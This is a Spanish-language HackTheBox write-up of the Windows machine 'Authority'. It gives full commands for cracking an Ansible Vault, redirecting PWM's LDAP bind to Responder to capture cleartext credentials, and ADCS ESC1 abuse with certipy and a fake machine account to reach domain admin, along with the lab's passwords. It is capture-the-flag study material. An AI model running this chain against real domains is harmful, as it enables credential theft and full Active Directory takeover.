# HTB Authority — Writeup Completo
### Dificultad: Medium | OS: Windows | Técnicas: SMB Anon, Ansible Vault, PWM LDAP Redirect, ADCS ESC1

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración SMB Anónima](#2-enumeración-smb-anónima)
3. [Extracción y Crackeo de Ansible Vault](#3-extracción-y-crackeo-de-ansible-vault)
4. [Acceso al Portal PWM](#4-acceso-al-portal-pwm)
5. [Captura de Credenciales LDAP con Responder](#5-captura-de-credenciales-ldap-con-responder)
6. [Acceso Inicial — Shell como svc_ldap](#6-acceso-inicial--shell-como-svc_ldap)
7. [Escalada de Privilegios — ADCS ESC1](#7-escalada-de-privilegios--adcs-esc1)
8. [Acceso como Administrator](#8-acceso-como-administrator)
9. [Cadena de Ataque Resumida](#9-cadena-de-ataque-resumida)
10. [Conceptos Clave para OSEP](#10-conceptos-clave-para-osep)

---

## 1. Reconocimiento

### Escaneo de puertos con Nmap

```bash
nmap --privileged -sV -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389 -oN target 10.129.229.56
```

### Puertos relevantes identificados

| Puerto | Servicio | Relevancia |
|--------|----------|------------|
| 88 | Kerberos | Dominio AD activo |
| 389/636 | LDAP/LDAPS | Active Directory |
| 445 | SMB | Compartidos de red |
| 5985 | WinRM | Shell remota (evil-winrm) |
| 8443 | HTTPS (Tomcat) | Portal PWM |
| 9389 | .NET Message Framing | ADCS |

### Información clave del escaneo

- **Hostname:** `AUTHORITY`
- **Dominio:** `authority.htb` / `authority.htb.corp`
- **OS:** Windows Server 2019
- **Clock skew:** -2h58m (importante para Kerberos más adelante)

```bash
# Añadir al /etc/hosts
echo "10.129.229.56 authority.htb authority.authority.htb" | sudo tee -a /etc/hosts
```

---

## 2. Enumeración SMB Anónima

### Listar shares disponibles

```bash
smbmap -H 10.129.229.56 -u 'null'
```

**Resultado:** El share `Development` tiene permisos de **READ ONLY** sin autenticación.

### Navegar el share

```bash
smbclient --no-pass //10.129.229.56/Development
```

```
smb: \> cd Automation\Ansible\PWM\
smb: \Automation\Ansible\PWM\> ls
```

Se encuentran los archivos:
- `ansible_inventory` — credenciales en texto plano
- `ansible.cfg` — configuración del rol
- `defaults/main.yml` — secretos cifrados con Ansible Vault

### Descargar los archivos

```bash
get ansible_inventory
get ansible.cfg
cd defaults\
get main.yml
```

### Contenido de ansible_inventory

```ini
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

> **Nota:** Estas credenciales NO funcionaron directamente. El `ansible_inventory` corresponde a credenciales de despliegue, no de producción.

---

## 3. Extracción y Crackeo de Ansible Vault

### Contenido de defaults/main.yml

El archivo contiene tres secretos cifrados con **Ansible Vault (AES256)**:

```yaml
pwm_admin_login: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    32666534386435366537653136663731...

pwm_admin_password: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    31356338343963323063373435363261...

ldap_admin_password: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    63303831303534303266356462373731...
```

### Extraer el hash para john

```bash
cat > vault_admin_password.txt << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
...
EOF

ansible2john vault_admin_password.txt > vault_hash.txt
```

### Crackear con john

```bash
john vault_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Vault password:** `!@#$%^&*`

### Instalar ansible-vault y descifrar

```bash
pip3 install ansible-vault
# o
pipx install certipy-ad  # para certipy más adelante
```

```bash
ansible-vault view vault_admin_password.txt --vault-pass-file <(echo '!@#$%^&*')
ansible-vault view vault_admin_login.txt    --vault-pass-file <(echo '!@#$%^&*')
ansible-vault view vault_ldap_password.txt  --vault-pass-file <(echo '!@#$%^&*')
```

### Credenciales obtenidas

| Variable | Valor |
|----------|-------|
| `pwm_admin_login` | `svc_pwm` |
| `pwm_admin_password` | `pWm_@dm!N_!23` |
| `ldap_admin_password` | `DevT3st@123` |

---

## 4. Acceso al Portal PWM

PWM (Password Self-Service) está corriendo en el puerto **8443** bajo Apache Tomcat.

### Acceder al Configuration Manager

```
https://10.129.229.56:8443/pwm/private/config/manager
```

Credenciales: `svc_pwm` / `pWm_@dm!N_!23`

### Navegar al setting de LDAP URL

```
LDAP → LDAP Directories → default → Connection
```

Aquí se encuentra el campo **LDAP URLs** con el valor actual:
```
ldaps://authority.authority.htb:636
```

---

## 5. Captura de Credenciales LDAP con Responder

### Paso 1 — Levantar Responder

```bash
sudo responder -I tun0 -v
```

### Paso 2 — Modificar la LDAP URL en PWM

Cambiar la URL de:
```
ldaps://authority.authority.htb:636
```
A:
```
ldap://TU_IP_TUN0:389
```

Guardar y hacer click en **"Test LDAP Connection"**.

### Resultado en Responder

```
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

> **¿Por qué funciona?** PWM intenta hacer un bind LDAP para testear la conexión. Al redirigirlo a nuestra máquina (sin TLS), Responder captura las credenciales en texto plano antes de que se pueda establecer un canal seguro.

---

## 6. Acceso Inicial — Shell como svc_ldap

### Verificar credenciales

```bash
crackmapexec smb 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
# [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
```

### Conectar con evil-winrm

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

### User flag

```powershell
type C:\Users\svc_ldap\Desktop\user.txt
```

---

## 7. Escalada de Privilegios — ADCS ESC1

### Enumeración de ADCS con Certipy

```bash
pipx install certipy-ad

certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' \
  -dc-ip 10.129.229.56 -vulnerable -stdout
```

### Vulnerabilidad encontrada: ESC1 en template CorpVPN

```
Template Name    : CorpVPN
Enrollee Supplies Subject : True          ← Atacante controla el SAN/UPN
Client Authentication     : True          ← Sirve para autenticarse
Enrollment Rights         : Domain Computers  ← Solo computers pueden enrollarse
Vulnerabilities  : ESC1
```

**Condiciones de ESC1:**
- El enrollee puede especificar el Subject (UPN arbitrario)
- El certificado permite Client Authentication
- No requiere aprobación del manager

**Restricción:** Solo `Domain Computers` pueden enrollarse, no usuarios normales.

**Solución:** Crear una machine account falsa (requiere `SeMachineAccountPrivilege` o MAQ > 0).

### Paso 1 — Crear machine account falsa

```bash
impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' \
  -computer-name 'FAKEMACHINE$' \
  -computer-pass 'FakePass123!' \
  -dc-ip 10.129.229.56
```

### Paso 2 — Solicitar certificado con UPN de Administrator

```bash
certipy req -u 'FAKEMACHINE$@authority.htb' -p 'FakePass123!' \
  -dc-ip 10.129.229.56 \
  -ca AUTHORITY-CA \
  -template CorpVPN \
  -upn administrator@authority.htb \
  -target authority.authority.htb
```

Esto genera `administrator.pfx` con el UPN `administrator@authority.htb` embebido.

### Paso 3 — Autenticar con el certificado

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56
```

> **Error esperado:** `KDC_ERR_PADATA_TYPE_NOSUPP` — PKINIT no soportado.
> **Solución:** Usar `-ldap-shell` para autenticarse vía LDAPS en su lugar.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
```

```
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands
#
```

---

## 8. Acceso como Administrator

### Opción A — Añadir svc_ldap a Domain Admins

```
# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```

Luego reconectar con evil-winrm:

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

### Opción B — Cambiar contraseña de Administrator

```
# change_password administrator NewPass123!
Password changed successfully!
```

```bash
evil-winrm -i 10.129.229.56 -u administrator -p 'NewPass123!'
```

### Root flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 9. Cadena de Ataque Resumida

```
SMB Anónimo
    └─► Ansible Vault (john crack: !@#$%^&*)
            └─► Credenciales PWM (svc_pwm / pWm_@dm!N_!23)
                    └─► Portal PWM Config Manager
                            └─► LDAP URL redirect → Responder
                                    └─► svc_ldap / lDaP_1n_th3_cle4r! (cleartext)
                                            └─► evil-winrm shell (user.txt)
                                                    └─► ADCS ESC1 (CorpVPN template)
                                                            └─► FAKEMACHINE$ → cert UPN=administrator
                                                                    └─► certipy ldap-shell → Domain Admin
                                                                            └─► Administrator shell (root.txt)
```

---

## 10. Conceptos Clave para OSEP

### Ansible Vault
- Los playbooks de Ansible en entornos de desarrollo frecuentemente contienen secretos cifrados
- `ansible2john` + `john` permiten crackear la vault password offline
- Una vez crackeada, `ansible-vault view` descifra cualquier variable

### PWM (Password Self-Service)
- Aplicación web que gestiona contraseñas de AD vía LDAP
- El Configuration Manager permite modificar la URL del servidor LDAP
- Si se puede cambiar la URL a un servidor controlado por el atacante, el bind LDAP se captura en cleartext

### Responder — LDAP Cleartext Capture
- PWM usa `ldap://` (sin TLS) cuando se cambia la URL
- Responder escucha en el puerto 389 y captura las credenciales del bind en texto plano
- Esto es posible porque muchas aplicaciones no validan el servidor LDAP al que se conectan

### ADCS ESC1
- **Condición:** Template con `EnrolleeSuppliesSubject` + `Client Authentication`
- **Impacto:** El atacante puede solicitar un certificado con el UPN de cualquier usuario, incluyendo Administrator
- **Restricción común:** Solo `Domain Computers` pueden enrollarse → solución: crear machine account con `impacket-addcomputer`
- **PKINIT bloqueado:** Si el DC no soporta PKINIT, usar `certipy auth -ldap-shell` para autenticarse vía LDAPS

### MachineAccountQuota (MAQ)
- Por defecto, cualquier usuario del dominio puede crear hasta **10 machine accounts**
- `SeMachineAccountPrivilege` también permite esto
- Las machine accounts creadas por usuarios no tienen privilegios especiales por sí solas, pero pueden usarse como vector para ADCS

### Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `smbmap` / `smbclient` | Enumeración SMB anónima |
| `ansible2john` + `john` | Crackeo de Ansible Vault |
| `ansible-vault` | Descifrado de secrets |
| `Responder` | Captura de credenciales LDAP cleartext |
| `crackmapexec` | Validación de credenciales |
| `evil-winrm` | Shell remota WinRM |
| `certipy` | Enumeración y explotación ADCS |
| `impacket-addcomputer` | Creación de machine accounts |

---

*Máquina resuelta el 10/03/2026 — HackTheBox: Authority*